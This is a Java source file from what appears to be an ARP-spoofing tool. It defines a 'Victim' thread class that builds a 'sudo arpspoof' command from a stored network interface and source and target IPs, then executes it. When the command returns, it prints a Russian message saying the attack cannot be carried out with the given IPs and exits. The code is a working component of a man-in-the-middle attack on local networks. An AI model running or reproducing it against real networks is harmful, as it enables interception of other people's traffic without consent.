package methods.threads;

import POJO.Data;
import methods.ExecuteLinuxCommand;

/**
 * Created by Guardeec on 01.02.16.
 */
public class Victim implements Runnable {
    private final Data data = Data.getInstance();
    public void run() {
        String command;
        synchronized (data){
            command = "sudo arpspoof -i "+data.getNetworkInteface()+" -t "+data.getSourceIP()+" "+data.getTargetIP();
        }
        System.out.println(command);
        ExecuteLinuxCommand.executeLinuxCommand(command);

        System.out.println("Невозможно осуществить с заданными IP");
        System.exit(0);
    }
}
